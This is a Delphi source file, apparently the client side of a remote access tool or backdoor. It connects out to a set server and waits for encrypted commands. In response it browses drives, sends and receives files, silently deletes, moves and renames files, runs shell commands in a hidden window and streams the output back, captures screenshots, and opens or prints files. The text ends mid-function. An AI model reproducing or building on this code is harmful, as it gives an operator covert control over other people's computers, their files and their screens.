unit FG;

interface

uses
Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
Vcl.Controls, Vcl.Forms, Vcl.Dialogs, System.Win.ScktComp, Vcl.StdCtrls,
Vcl.ComCtrls,IniFiles, Vcl.ExtCtrls, Vcl.Buttons,math,BN,jpeg;

type
SENDFLAGT=(NONU,UP,DOWN,DOWNUN,DDDDFS,DDDD,NameList,open2,open6,zhuce,RETY,send,ddddty,ddddEX,ddddhg,ddddhgfg,ddddEND,
TTTTTTTTTTTT,TTTTTTTTTTTF,TTTTTTTTTTFF,RRRRRRRRRRRR,FFFFFFFFFFFF,FFFFFFFFFFFD,FLLIST,user,FAHG);
   fhdf=record
   datasd:SENDFLAGT;
   ID:integer;
 end;


 fileFD=record
 name:string[50];
 b:boolean;
 end;

 TMYSENDdf=record
  ID:int64;
  flag:SENDFLAGT;
  name:string[20];
  sendTI:string[32];
  zi:array[0..1228] of ansichar;
  end;
   TMYDATAdf=record
  ID:int64;
  flag:SENDFLAGT;
  //name:string[20];
  //sendTI:string[32];
  zi:array[0..115970] of ansichar;
  end;
  My_HG=class(tthread)
    private
    opat:string;
    TB:string;
    oldopat:Tstrings;
    data:TMYSENDdf;
    buffThg2,buffThg:pbyte;
    sendFA:TMYSENDdf;
    FLAGIDHG,sizeDATA:integer;
    ZC:array of fileFD;
    Filename2:Tstrings;
    name1:string;
    name2:string;
    BUUF:Pbyte;
    FCltSocket: TClientSocket;
    CZ:array of fileFD;
    CZnunm,CZsize:integer;
    Psize:integer;
    st:TstRings;
    bb:boolean;
    FpStream: TWinSocketStream;
     function My_Find(opath:string):integer;
     procedure My_Find2(var st:Tstrings;opath:string);
     function My_Find3(opath,filename_t:string;var i:integer):integer;
     function getPath:integer;
    procedure sendpa;
    procedure sendpr;
    procedure UP(const sendTI:TMYSENDdf);
    procedure UP2(const sendTI:TMYSENDdf);
    procedure jipi(const sendTI:TMYSENDdf);
    procedure jipi2(const sendTI:TMYSENDdf);
    procedure jieHG(const sendTI:TMYSENDdf);
    procedure UPFD(const sendTI:TMYSENDdf);
    procedure UPFD2(const sendTI:TMYSENDdf);
    procedure DOWN(const sendTI:TMYSENDdf);
    function CopyDir(sDirName:String;sToDirName:String):Boolean;
    function IsFileOrDir(AFilePath: string): Integer;
    procedure MY_MOVE_biao(const sendTI:TMYSENDdf);
    procedure DELETE(const sendTI:TMYSENDdf);
    function DelTree(DirName : string): Boolean;
    procedure RunDosCommand(const sendTI:TMYSENDdf);
    procedure ScreenShot(x: integer; y: integer; Width: integer; Height: integer; bm: TBitMap);
    procedure RunHg(const sendTI:TMYSENDdf);
    procedure RunHg2(const sendTI:TMYSENDdf);
    procedure PrintHg(const sendTI:TMYSENDdf);
    protected
    procedure SENDDATA(const pStreamhg:TWinSocketStream;const datahg:TMYDATAdf);overload;
    procedure SENDDATA(const pStreamhg:TWinSocketStream;const datahg:TMYSENDdf);overload;
    procedure Execute; override;
    public
    procedure SENDTIME();
    property pStream:TWinSocketStream read FpStream write FpStream;


    property CltSocket: TClientSocket read FCltSocket write FCltSocket;
    constructor Create(CreateSuspended: Boolean;name,nameb:string;const FLAGID:integer); overload;
  end;



const
cvsizeMD = 52 ;
var
  visiosma,visios:int64;

implementation


Uses
IdHashMessageDigest,
ActiveX,Unit2,shellapi;
/////////////////Tl//////////////////////
constructor My_HG.Create(CreateSuspended: Boolean;name,nameb:string;const FLAGID:integer);
var
i:integer;
begin
//showmessage(inttostr(sizeof(fileFD)));
   //bg:=false;
   oldopat:=TstringList.Create;
   st:=TstringList.Create;
   CoInitialize(nil);
   CltSocket:=TClientSocket.Create(nil);
   CltSocket.ClientType:=ctBlocking;
   CltSocket.Host:=ip_hg;
   CltSocket.Port:=port_hg;
   try
   CltSocket.Open;
   Except
   TThread.CreateAnonymousThread(rt).Start;
   if CltSocket<>nil then CltSocket.Close;
   st.Free;
   Terminate;
   cg:=nil;
   CoUninitialize;
   end;
   FLAGIDHG:=FLAGID;
   name1:=name;
   name2:=nameb;
   inherited Create(CreateSuspended);
end;
procedure My_HG.SENDTIME();
begin



data.flag:=NONU;


SENDDATA(pStream,data);

TiSd:=0;
end;

procedure My_HG.SENDDATA(const pStreamhg:TWinSocketStream;const datahg:TMYDATAdf);
begin
if AEST=1 then
begin
pStreamhg.Write(datahg,sizeof(datahg));
end else
begin
 move(datahg,BUUF^,sizeof(datahg));
 ENAES(BUUF,KEYUEN,sizeof(datahg));
 pStreamhg.Write(BUUF^,sizeof(datahg));
end;
end;
procedure My_HG.SENDDATA(const pStreamhg:TWinSocketStream;const datahg:TMYSENDdf);
begin
if AEST=1 then
begin
pStreamhg.Write(datahg,sizeof(datahg));
end else
begin
 move(datahg,BUUF^,sizeof(datahg));
 ENAES(BUUF,KEYUEN,sizeof(datahg));
 pStreamhg.Write(BUUF^,sizeof(datahg));
end;
end;
procedure My_HG.Execute;
var
Asstr:ansistring;
fghj:fhdf;
ds:string;
i_f,i:integer;
{bool2,}bool:boolean;
filename2:Tstrings;




//hjkg:Extended;
begin
FreeOnTerminate:=true;
getdir(0,TB);
   //getdir(0,ds);
   pStream := TWinSocketStream.Create(CltSocket.Socket,i.MaxValue-1);
   TSbool:=true;
   TiSd:=0;
   TThread.CreateAnonymousThread(TimeSend).Start;
   data.flag:=FAHG;
   data.ID:=FLAGIDHG;
   if AEST=2 then getmem(BUUF,sizeof(data));
   data.name:=name1;
   data.sendTi:=name2;
SENDDATA(pStream,data);
TiSd:=0;
   //BUFFBU:=Tmemorystream.Create;
   try
  try

  //if MDYT=2 then mymd5:=TIdHashMessageDigest5.Create;
   bb:=true;
   //if not CltSocket.Active then rt();

    while (not Terminated) and (CltSocket.Active) do
    begin
    bool:=pStream.WaitForData(i.MaxValue-1);
    if bool then
     begin
     TiSd:=0;
if AEST=2 then
 begin
    if pStream.Read(BUUF^, sizeof(data))=0 then
        begin
         if pStream<>nil then
         begin
          pStream.Free;
          pStream:=nil;
         end;
         if CltSocket<>nil then
         begin
          CltSocket.Close;
          CltSocket:=nil;
         end;
        end;
       DNAES(BUUF,KEYUDE,sizeof(data));
       move(BUUF^,data,sizeof(data));
 end else
 begin
    if pStream.Read(data, sizeof(data))=0 then
        begin
         if pStream<>nil then
         begin
          pStream.Free;
          pStream:=nil;
         end;
         if CltSocket<>nil then
         begin
          CltSocket.Close;
          CltSocket:=nil;
         end;
        end;
 end;
    if data.ID = 10 then //强制重置
    begin

st.Clear;
CZ:=nil;



      bb:=true;
    end;
     //-----------------------------------------------------    执行逻辑op


    try
     case data.ID of
     2:begin
       if bb then
       begin
       sendFA.name:=data.name;
       CZnunm:=getPath;
       CZsize:=CZnunm*cvsizeMD;
       sendpa;
       opat:='';
       end;
       end;


     5:begin
         if bb then
         begin
         sendFA.name:=data.name;
         //move(sendFA.zi[0], Asstr[1],strtoint(sendFA.sendTI));
         Asstr:=st[strtoint(data.sendTI)];
         CZnunm:=My_Find(Asstr);
         opat:=Asstr;
         CZsize:=CZnunm*cvsizeMD;
         sendpa;
         end;

       end;

     80:begin
       MY_move_biao(data);
       end;
     81:begin
     var t:Tstrings;
       try
       t:=Tstringlist.Create;
       if oldopat.Count>0 then
        begin
           for I := 0 to oldopat.Count-1 do
           begin
             t.Add(opat+ExtractFileName(oldopat[i]));
           end;
           for I := 0 to oldopat.Count-1 do
           begin
             MoveFile(PChar(oldopat[i]), PChar(t[i]));
           end;

        end;
           if bb then
            begin
            sendFA.name:=data.name;
            if opat<>'' then
             begin
             CZnunm:=My_Find(Asstr);
             opat:=Asstr;
             CZsize:=CZnunm*cvsizeMD;
             sendpa;
             end else
             begin
              sendFA.name:=data.name;
              CZnunm:=getPath;
              CZsize:=CZnunm*cvsizeMD;
              sendpa;
              opat:='';
             end;
             end;
       finally
       t.Free;
       end;

     end;
     82:begin
     var t:Tstrings;
       try
       t:=Tstringlist.Create;
       if oldopat.Count>0 then
        begin
           for I := 0 to oldopat.Count-1 do
           begin
             t.Add(opat+ExtractFileName(oldopat[i]));
           end;
           for I := 0 to oldopat.Count-1 do
           begin
             case IsFileOrDir(oldopat[i]) of
               1:begin

               Copydir(oldopat[i], t[i]);
               end;
               2:begin
               CopyFile(PChar(oldopat[i]), PChar(t[i]),TRUE);
               end;
             end;


           end;

        end;
           if bb then
            begin
            sendFA.name:=data.name;
            if opat<>'' then
             begin
             CZnunm:=My_Find(Asstr);
             opat:=Asstr;
             CZsize:=CZnunm*cvsizeMD;
             sendpa;
             end else
             begin
              sendFA.name:=data.name;
              CZnunm:=getPath;
              CZsize:=CZnunm*cvsizeMD;
              sendpa;
              opat:='';
             end;
             end;
       finally
       t.Free;
       end;

     end;

        83:begin
     var t:Tstrings;
       try
       t:=Tstringlist.Create;
       if oldopat.Count>0 then
        begin
           for I := 0 to oldopat.Count-1 do
           begin
             t.Add(opat+ExtractFileName(oldopat[i]));
           end;
               for I := 0 to oldopat.Count-1 do
           begin
             case IsFileOrDir(oldopat[i]) of
               1:begin

               Copydir(oldopat[i], t[i]);
               end;
               2:begin
               CopyFile(PChar(oldopat[i]), PChar(t[i]),TRUE);
               end;
             end;
           end;

        end;
           if bb then
            begin
            sendFA.name:=data.name;
            if opat<>'' then
             begin
             CZnunm:=My_Find(Asstr);
             opat:=Asstr;
             CZsize:=CZnunm*cvsizeMD;
             sendpa;
             end else
             begin
              sendFA.name:=data.name;
              CZnunm:=getPath;
              CZsize:=CZnunm*cvsizeMD;
              sendpa;
              opat:='';
             end;
             end;
       finally
       t.Free;
       end;
        end;
        85:begin
            ForceDirectories(opat+data.sendTI);
            if bb then
            begin
            sendFA.name:=data.name;
            if opat<>'' then
             begin
             CZnunm:=My_Find(Asstr);
             opat:=Asstr;
             CZsize:=CZnunm*cvsizeMD;
             sendpa;
             end else
             begin
              sendFA.name:=data.name;
              CZnunm:=getPath;
              CZsize:=CZnunm*cvsizeMD;
              sendpa;
              opat:='';
             end;
             end;
        end;
        89:begin
         var k:integer;
         move(data.zi[0],k,4);


         if CZ[k].b then
         begin
         RenameFile(opat+CZ[k].name,opat+data.sendTI);
         end
         else
         begin
         RenameFile(opat+copy(CZ[k].name,1 , length(CZ[k].name)-1),opat+data.sendTI);
         //ExtractFileName(oldopat[i])
         end;
            if bb then
            begin
            sendFA.name:=data.name;
            if opat<>'' then
             begin
             CZnunm:=My_Find(Asstr);
             opat:=Asstr;
             CZsize:=CZnunm*cvsizeMD;
             sendpa;
             end else
             begin
              sendFA.name:=data.name;
              CZnunm:=getPath;
              CZsize:=CZnunm*cvsizeMD;
              sendpa;
              opat:='';
             end;
             end;
        end;
     6:begin
        sendFA.name:=data.name;
        sendpr;
       end;
     7:begin
        opat:=copy(opat,1 , length(opat)-1);
        Asstr:=copy(opat,1 , LastDelimiter ('\',opat));

        sendFA.name:=data.name;

        CZnunm:=My_Find(Asstr);
        opat:=Asstr;
        CZsize:=CZnunm*cvsizeMD;
        sendpa;
       end;
      4:begin
         df:=1;
         CltSocket.Close;
        end;
      16:begin
          UP(data);
         end;
      22:begin
         ds:=st[strtoint(data.sendTI)]+'\';
         st[strtoint(data.sendTI)]:=ds;

         CZ[strtoint(data.sendTI)].name:= CZ[strtoint(data.sendTI)].name+'\';
         CZ[strtoint(data.sendTI)].b:=false;
         end;
       17:begin
          UP2(data);
          end;
       15:begin
          DOWN(data);
          end;
       18:begin
          DELETE(data);
          end;
       20:begin
            if bb then
            begin
            sendFA.name:=data.name;
            if opat<>'' then
             begin
             CZnunm:=My_Find(Asstr);
             opat:=Asstr;
             CZsize:=CZnunm*cvsizeMD;
             sendpa;
             end else
             begin
              sendFA.name:=data.name;
              CZnunm:=getPath;
              CZsize:=CZnunm*cvsizeMD;
              sendpa;
              opat:='';
             end;
             end;
          end;
       26:begin
          jipi2(data);


          end;
       27:begin
       UPFD(data);


       end;
       66:begin
       RunDosCommand(data);


       end;
       67:begin
         RunHg(data);
       end;
       68:begin
         RunHg2(data);
       end;
       70:begin
         PrintHg(data);
       end;
       76:begin
//        opat:=copy(opat,1 , length(opat)-1);
//        Asstr:=copy(opat,1 , LastDelimiter ('\',opat));
        st.Clear;
        CZ:=nil;
        sendFA.name:=data.name;
        i_f:=0;
        CZnunm:=My_Find3(opat,data.sendTI,i_f);
//        opat:=Asstr;
        CZsize:=CZnunm*cvsizeMD;
        sendpa;
       end;
     end;
  Except
   //rt();
   end;


    //-----------------------------------------------------     执行逻辑ed
    end;
    end;


  finally
    if AEST=2 then freemem(BUUF);
    setlength(CZ,0);

      try
         if pStream<>nil then
         begin
          pStream.Free;
          pStream:=nil;
         end;

      Except

      end;
TThread.CreateAnonymousThread(rt).Start;
         if CltSocket<>nil then
         begin
          CltSocket.Close;
          CltSocket:=nil;
         end;
   CoUninitialize;
   st.Free;
   oldopat.Free;
   Terminate;
   cg:=nil;


       end;
       Except
   //rt();
       end;
end;
procedure My_HG.PrintHg(const sendTI:TMYSENDdf);
var
hg:string;
i:integer;
begin
i:=strtoint(sendTI.sendTI);
hg:=opat+CZ[i].name;
ShellExecute(0, pchar('print'), pchar(hg), nil, nil, SW_SHOWNORMAL);
end;
procedure My_HG.RunHg2(const sendTI:TMYSENDdf);
var
hg:string;
i:integer;
begin
i:=strtoint(sendTI.sendTI);
hg:=opat+CZ[i].name;
ShellExecute(0, pchar('open'), pchar(hg), nil, nil, SW_SHOWNORMAL);
end;
procedure My_HG.RunHg(const sendTI:TMYSENDdf);
var
SendT:TMYSENDdf;
br:boolean;
i:integer;
t:integer;
cv:tstrings;
Read,lzsa:string;
begin
try

  i:=1;
  cv:=tstringlist.Create;
  Read:=strpas(sendTI.zi);
  cv.Clear;
  br:=true;
  while br do
  begin
  i:=pos('#',read);
  Read:=copy(Read,i+1,length(Read)-1);
  t:=pos('#',read);
   if t=0 then
   begin
   br:=false;
   break;
   end;
  cv.Add(copy(Read,1,t-1));
  Read:=copy(Read,t,length(Read)-(t-1));
  end;

  ShellExecute(0, pchar(cv[0]), pchar(cv[1]), pchar(cv[2]), nil, SW_SHOWNORMAL);

 finally
  cv.Free;
  cv:=nil;
 end;
end;
procedure My_HG.UP(const sendTI:TMYSENDdf);
var
sddhg:TstringS;
l,h,i:integer;
s:string;
begin
try
B:=False;
sddhg:=tstringlist.Create;
move(sendTI.zi[0],h,4);
for I := 0 to h-1 do
  begin
   move(sendTI.zi[(I+1)*4],l,4);
   s:=st[l];
   if CZ[l].b then

   sddhg.Add( s)
   else
   begin
      B:=True;
      s:=copy(s,1,length(s)-1);
      BinT:=Length(ExtractFileDir(s));
      My_Find2(sddhg,s);
   end;
   //s:= sddhg[i];
  end;
  ch:=My_Tl.Create(false,sddhg,'UP'+sendTI.sendTI,'DOWN'+sendTI.sendTI,6);
finally
   sddhg.Free;
end;
end;

procedure My_HG.jipi(const sendTI:TMYSENDdf);
var
sddhg:TstringS;

FBMP:TBitMap;
myjpeg:Tjpegimage;
 mStream: TStream;
begin


B:=False;
           try
           mStream := TMemoryStream.Create;
           FBMP := TBitMap.Create;
           sleep(200);
           ScreenShot(0, 0, Screen.Width, Screen.Height, FBMP);
           myjpeg:=TJPEGImage.Create();
           myjpeg.Assign(FBMP);
           myjpeg.CompressionQuality :=60;
           myjpeg.SaveToStream(mStream);

           finally
           FBMP.FreeImage;
           FreeAndNil(FBMP);

           myjpeg.Free;


           end;
//sddhg.Add(TB+'\'+'a.jpg');
cm:=My_Ml.Create(false,mStream,'UP'+sendTI.sendTI,'DOWN'+sendTI.sendTI,6);

end;


procedure My_HG.DELETE(const sendTI:TMYSENDdf);
var
l,h,i:integer;
s:string;
begin
move(sendTI.zi[0],h,4);
for I := 0 to h-1 do
  begin
   move(sendTI.zi[(I+1)*4],l,4);
   s:=st[l];
   if CZ[l].b then

   DeleteFile(s)
   else
   DelTree(copy(s,1,length(s)-1));
   //s:= sddhg[i];
  end;
end;

procedure My_HG.my_MOVE_biao(const sendTI:TMYSENDdf);
var
l,h,i:integer;
s,s1:string;
begin
oldopat.Clear;
move(sendTI.zi[0],h,4);
for I := 0 to h-1 do
  begin
   move(sendTI.zi[(I+1)*4],l,4);
   s:=st[l];
   //MoveFile(pchar(old),pchar(new),);
  if CZ[l].b then

   oldopat.Add(s)
   else
   oldopat.Add(copy(s,1,length(s)-1));
  end;
end;

procedure My_HG.DOWN(const sendTI:TMYSENDdf);
begin
if opat<>'' then

  cf:=My_Cl.Create(False,'DOWN'+sendTI.sendTI,'UP'+sendTI.sendTI,opat,7);

end;



procedure My_HG.UP2(const sendTI:TMYSENDdf);
var
sddhg:TstringS;
l,h,i:integer;
s:string;
begin
try
B:=False;
sddhg:=tstringlist.Create;
move(sendTI.zi[0],h,4);
for I := 0 to h-1 do
  begin
   move(sendTI.zi[(I+1)*4],l,4);
   s:=st[l];
 if CZ[l].b then

   sddhg.Add( s)
   else
   begin
      B:=True;
      s:=copy(s,1,length(s)-1);
      BinT:=Length(ExtractFileDir(s));
      My_Find2(sddhg,s);
   end;
   //s:= sddhg[i];
  end;
  ch:=My_Tl.Create(false,sddhg,'UP'+sendTI.name,'',5);
finally
   sddhg.Free;
end;
end;

procedure My_HG.UPFD2(const sendTI:TMYSENDdf);
var
sddhg:TstringS;
l,h,i:integer;
s:string;
begin
try
B:=True;
sddhg:=tstringlist.Create;
move(sendTI.zi[0],h,4);

   move(sendTI.zi[(I+1)*4],l,4);
   s:=st[l];
  BinT:=Length(ExtractFileDir(s));
  My_Find2(sddhg,s);
  ch:=My_Tl.Create(false,sddhg,'UP'+sendTI.name,'',5);
finally
   sddhg.Free;
end;
end;


procedure My_HG.UPFD(const sendTI:TMYSENDdf);
var
sddhg:TstringS;
l,h,i:integer;
s:string;
begin
try
B:=True;
sddhg:=tstringlist.Create;
move(sendTI.zi[0],h,4);

   move(sendTI.zi[(I+1)*4],l,4);
   s:=st[l];
  BinT:=Length(ExtractFileDir(s));
  My_Find2(sddhg,s);
  ch:=My_Tl.Create(false,sddhg,'UP'+sendTI.name,'',6);
finally
   sddhg.Free;
end;
end;

procedure My_HG.sendpa;
begin
Psize:=0;
getmem(buffThg,CZsize);
buffThg2:=buffThg;
   if CZsize<sizeof(sendFA.zi) then
   begin
          //buffThg:=@CZ;
          move(CZ[0],buffThg^,CZsize);
          bb:=true;
          sendFA.flag:=FAHG;
          sendFA.sendTI:=inttostr(CZnunm);
          sendFA.ID:=7;

          move(buffThg^,sendFA.zi[0],CZsize);
          SENDDATA(pStream,sendFA);
          TiSd:=0;
          buffThg:=buffThg2;
          freemem(buffThg);
   end else
   begin
          move(CZ[0],buffThg^,CZsize);
          bb:=false;
          sendFA.flag:=FAHG;
          sendFA.sendTI:=inttostr(CZnunm);
          sendFA.ID:=6;

          move(buffThg^,sendFA.zi[0],sizeof(sendFA.zi));
          SENDDATA(pStream,sendFA);
          TiSd:=0;
          Psize:=CZsize-sizeof(sendFA.zi);
          inc(buffThg,sizeof(sendFA.zi));
   end;


end;


procedure My_HG.sendpr;
begin

   if Psize<sizeof(sendFA.zi) then
   begin
          bb:=true;
          sendFA.flag:=FAHG;
          sendFA.sendTI:=inttostr(Psize);
          sendFA.ID:=8;

          move(buffThg^,sendFA.zi[0],Psize);
          SENDDATA(pStream,sendFA);
          TiSd:=0;
          buffThg:=buffThg2;
          freemem(buffThg);
   end else
   begin
          bb:=false;
          sendFA.flag:=FAHG;
          //sendFA.sendTI:=inttostr(CZnunm);
          sendFA.ID:=5;

          move(buffThg^,sendFA.zi[0],sizeof(sendFA.zi));
          SENDDATA(pStream,sendFA);
          TiSd:=0;
          Psize:=Psize-sizeof(sendFA.zi);
          inc(buffThg,sizeof(sendFA.zi));
   end;


end;





function My_HG.getPath:integer;
var
l,i:integer;
a:string;
begin
l:=0;
st.Clear;
CZ:=nil;
for i := 65 to 90 do
begin

if (GetDriveType(Pchar(chr(i)+':\')) = 2) or (GetDriveType(Pchar(chr(i)+':\')) = 3) then
begin
inc(l);
setlength(CZ,l);
a:=chr(i)+':\';
CZ[l-1].name:=a;
st.Add(a);
end;

end;

result := l;

end;



procedure My_HG.My_Find2(var st:Tstrings;opath:string);
var
opaths:string;
sc:TsearchRec;
found:integer;
begin
    found:=findfirst(opath+'\'+'*.*',faAnyFile,sc);
    while found=0 do
      begin
        if (sc.Name<>'.') and (sc.Name<>'..') and (sc.Attr=faDirectory) then
        begin
        opaths:=opath+'\'+sc.Name;
        My_Find2(st,opaths);
        end;
        if (sc.Name<>'.') and (sc.Name<>'..') and (sc.Attr<>faDirectory) then
        begin
                 if DirectoryExists(opath+'\'+sc.Name) then
           begin
          opaths:=opath+'\'+sc.Name;
          My_Find2(st,opaths)
           end else
           begin
            st.Add(opath+'\'+sc.Name);
           end;
        end;
          found:=findnext(sc);
        end;
      findclose(sc);
end;
function My_HG.IsFileOrDir(AFilePath: string): Integer;
var
  C: Cardinal;
begin
  Result := -1;
  C := GetFileAttributes(Pchar(AFilePath));//把string转换为PAnsiChar
  if C = $FFFFFFFF then
  begin
    // 文件或文件夹不存在
    Result := 0;
    Exit;
  end
  else if C and FILE_ATTRIBUTE_DIRECTORY <> 0 then
  begin
    // 是文件夹不是文件
    Result := 1;
    Exit;
  end
  else
  begin
     // 是文件
    Result := 2;
    Exit;
  end;
end;
function My_HG.CopyDir(sDirName:String;sToDirName:String):Boolean;
var
hFindFile:Cardinal;//拷贝整个目录(包括子目录)
t,tfile:String;
sCurDir:String[255];
FindFileData:WIN32_FIND_DATA;
begin
//先保存当前目录
sCurDir:=GetCurrentDir;
ChDir(sDirName);
hFindFile:=FindFirstFile('*.*',FindFileData);
if hFindFile<>INVALID_HANDLE_VALUE then
begin
if not DirectoryExists(sToDirName) then
ForceDirectories(sToDirName);
 repeat
tfile:=FindFileData.cFileName;
if (tfile='.') or (tfile='..') then
Continue;
if FindFileData.dwFileAttributes=FILE_ATTRIBUTE_DIRECTORY then
begin
t:=sToDirName+'\'+tfile;
if not DirectoryExists(t) then
ForceDirectories(t);
if sDirName[Length(sDirName)]<>'\' then
CopyDir(sDirName+'\'+tfile,t)
else
 CopyDir(sDirName+tfile,sToDirName+tfile);
end
else
begin
t:=sToDirName+'\'+tFile;
CopyFile(PChar(tfile),PChar(t),True);
end;
until FindNextFile(hFindFile,FindFileData)=false;
Winapi.Windows.FindClose(hFindFile);
end
else
begin
ChDir(sCurDir);
result:=false;
exit;
end;
//回到原来的目录下
ChDir(sCurDir);
result:=true;
end;


function My_HG.My_Find(opath:string):integer;
var
sc:TsearchRec;
i,found:integer;
begin
i:=0;
st.Clear;
CZ:=nil;
    found:=findfirst(opath+'\'+'*.*',faAnyFile,sc);
    while found=0 do
begin

      if (sc.Name<>'.') and (sc.Name<>'..') and (sc.Name<>'') and (sc.Name<>' ') then
      begin
      inc(i);
        setlength(CZ,i);

        //strr.Add(opdt+sc.Name);
        if sc.Attr=faDirectory then
         begin
         CZ[i-1].b:=false;
         CZ[i-1].name:=sc.Name+'\';
         st.Add(opath+sc.Name+'\');
         end else
         begin
                 if DirectoryExists(opath+'\'+sc.Name) then
                 begin
                   CZ[i-1].b:=false;
                   CZ[i-1].name:=sc.Name+'\';
                   st.Add(opath+sc.Name+'\');
                 end else
                 begin
                 CZ[i-1].b:=true;
                 CZ[i-1].name:=sc.Name;
                 st.Add(opath+sc.Name);
                 end;

         end;
      end;
        found:=findnext(sc);
end;
      findclose(sc);
      result := i;
end;
function My_HG.My_Find3(opath,filename_t:string;var i:integer):integer;
var
sc:TsearchRec;
b,found:integer;
o:string;
begin
try


    found:=findfirst(opath+'*'+filename_t+'*',faAnyFile,sc);
     while found=0 do
     begin


     if (sc.Name<>'.') and (sc.Name<>'..') then
      begin
      inc(i);
      setlength(CZ,i);
                  if sc.Attr=faDirectory then
                 begin
                 CZ[i-1].b:=false;
                 CZ[i-1].name:=sc.Name+'\';
                 st.Add(opath+sc.Name+'\');
                 end else
                 begin
                         if DirectoryExists(opath+'\'+sc.Name) then
                         begin
                           CZ[i-1].b:=false;
                           CZ[i-1].name:=sc.Name+'\';
                           st.Add(opath+sc.Name+'\');
                         end else
                         begin
                         CZ[i-1].b:=true;
                         CZ[i-1].name:=sc.Name;
                         st.Add(opath+sc.Name);
                         end;

                 end;
                found:=findnext(sc);
      end;
     end;

     findclose(sc);

    found:=findfirst(opath+'\'+'*.*',faAnyFile,sc);
            while found=0 do
        begin

              if (sc.Name<>'.') and (sc.Name<>'..') and (sc.Name<>'') and (sc.Name<>' ') then
              begin



                //strr.Add(opdt+sc.Name);
                if sc.Attr=faDirectory then
                 begin

                  o:=opath+sc.Name;
                  i:=My_Find3(o+'\',filename_t,i);

                 end;
              end;
                found:=findnext(sc);

        end;
        findclose(sc);

finally

    result := i;
end;

end;

procedure My_HG.RunDosCommand(const sendTI:TMYSENDdf);
var
    tm:ansistring;
    Command:String;
    hReadPipe: THandle;
    hWritePipe: THandle;
    SI: TStartUpInfo;
    PI: TProcessInformation;
    SA: TSecurityAttributes;
    BytesRead: DWORD;
    Avail,ExitCode,wrResult: DWORD;
    Dest: Array[0..1023] of ansiChar;
    CmdLine: Array[0..512] of Char;
    osVer: TOSVERSIONINFO;
    tmpstr: String;
begin
    setlength(tm,strtoint(sendTI.sendTI));
    move(sendTI.zi[0],tm[1],strtoint(sendTI.sendTI));
    Command:=tm;
    osVer.dwOSVersionInfoSize := Sizeof(TOSVERSIONINFO);
    GetVersionEX(osVer);
    if osVer.dwPlatformId = VER_PLATFORM_WIN32_NT then begin
        SA.nLength := SizeOf(SA);
        SA.lpSecurityDescriptor := nil;//@SD;
        SA.bInheritHandle := True;
        CreatePipe(hReadPipe, hWritePipe, @SA, 0);
    end else CreatePipe(hReadPipe, hWritePipe, nil, 1024);
    try
        Screen.Cursor := crHourglass;
        FillChar(SI, SizeOf(SI), 0);
        SI.cb := SizeOf(TStartUpInfo);
        SI.wShowWindow := SW_HIDE;
        SI.dwFlags := STARTF_USESHOWWINDOW;
        SI.dwFlags := SI.dwFlags or STARTF_USESTDHANDLES;
        SI.hStdOutput := hWritePipe;
        SI.hStdError := hWritePipe;
        StrPCopy(CmdLine, Command);
        if CreateProcess(nil, CmdLine, nil, nil, True,
                         NORMAL_PRIORITY_CLASS, nil, nil, SI, PI) then
        begin
            ExitCode := 0;
            while ExitCode = 0 do begin
                wrResult := WaitForSingleObject(PI.hProcess, 500);
                if PeekNamedPipe(hReadPipe, @Dest[0], 1024, @Avail,
                                 nil, nil) then begin
                    if Avail > 0 then begin
                            FillChar(Dest, SizeOf(Dest), 0);
                            ReadFile(hReadPipe, Dest[0], Avail, BytesRead, nil);
                            //TmpStr := Copy(Dest, 0, BytesRead-1);
                                      sendFA.flag:=FAHG;
                                      sendFA.sendTI:=inttostr(BytesRead-1);
                                      sendFA.ID:=66;

                                      move(Dest,sendFA.zi[0],BytesRead-1);
                                      SENDDATA(pStream,sendFA);
                    end;
                end;
                if wrResult <> WAIT_TIMEOUT then ExitCode := 1;
            end;
            GetExitCodeProcess(PI.hProcess, ExitCode);
            CloseHandle(PI.hProcess);
            CloseHandle(PI.hThread);
        end;
    finally
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        Screen.Cursor := crDefault;
    end;
end;


procedure My_HG.ScreenShot(x: integer; y: integer; Width: integer; Height: integer; bm: TBitMap);

var
  dc: HDC;
  lpPal: PLOGPALETTE;
begin
  // 检测所需抓屏的区域
  if ((Width = 0) or (Height = 0)) then
    exit;
  bm.Width := Width;
  bm.Height := Height;
  // 获取设备上下文
  dc := GetDc(0);
  if (dc = 0) then
    exit;
  { do we have a palette device? }
  if (GetDeviceCaps(dc, RASTERCAPS) AND RC_PALETTE = RC_PALETTE) then
  begin
    { allocate memory for a logical palette }
    GetMem(lpPal, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)));
    { zero it out to be neat }
    FillChar(lpPal^, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)), #0);
    { fill in the palette version }
    lpPal^.palVersion := $300;
    { grab the system palette entries }
    lpPal^.palNumEntries := GetSystemPaletteEntries(dc, 0, 256, lpPal^.palPalEntry);
    if (lpPal^.palNumEntries <> 0) then
    begin
      { create the palette }
      bm.Palette := CreatePalette(lpPal^);
    end;
    FreeMem(lpPal, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)));
  end;
  { copy from the screen to the bitmap }
  BitBlt(bm.Canvas.Handle, 0, 0, Width, Height, dc, x, y, SRCCOPY);
  { release the screen dc }
  ReleaseDc(0, dc);
end;


function My_HG.DelTree(DirName : string): Boolean;
var
SHFileOpStruct : TSHFileOpStruct;
DirBuf : array [0..255] of char;
begin
try
Fillchar(SHFileOpStruct,Sizeof(SHFileOpStruct),0);
FillChar(DirBuf, Sizeof(DirBuf), 0 );
StrPCopy(DirBuf, DirName);
with SHFileOpStruct do begin
Wnd := 0;
pFrom := @DirBuf;
wFunc := FO_DELETE;
fFlags := FOF_ALLOWUNDO;
fFlags := fFlags or FOF_NOCONFIRMATION;
fFlags := fFlags or FOF_SILENT;
end; 
Result := (SHFileOperation(SHFileOpStruct) = 0);
except
Result := False;
end;
end;

///jiepingdanyuan

function SelectHDESK(HNewDesk: HDESK): Boolean; stdcall;
var
  HOldDesk: HDESK;
  dwDummy:  DWORD;
  sName:    array[0..255] of Char;
begin
 Result := False;
  HOldDesk := GetThreadDesktop(GetCurrentThreadId);
  if (not GetUserObjectInformation(HNewDesk, UOI_NAME, @sName[0], 256, dwDummy)) then
  begin
    OutputDebugString('GetUserObjectInformation Failed.');
    Exit;
  end;
  if (not SetThreadDesktop(HNewDesk)) then
  begin
    OutputDebugString('SetThreadDesktop Failed.');
    Exit;
  end;
  if (not CloseDesktop(HOldDesk)) then
  begin
    OutputDebugString('CloseDesktop Failed.');
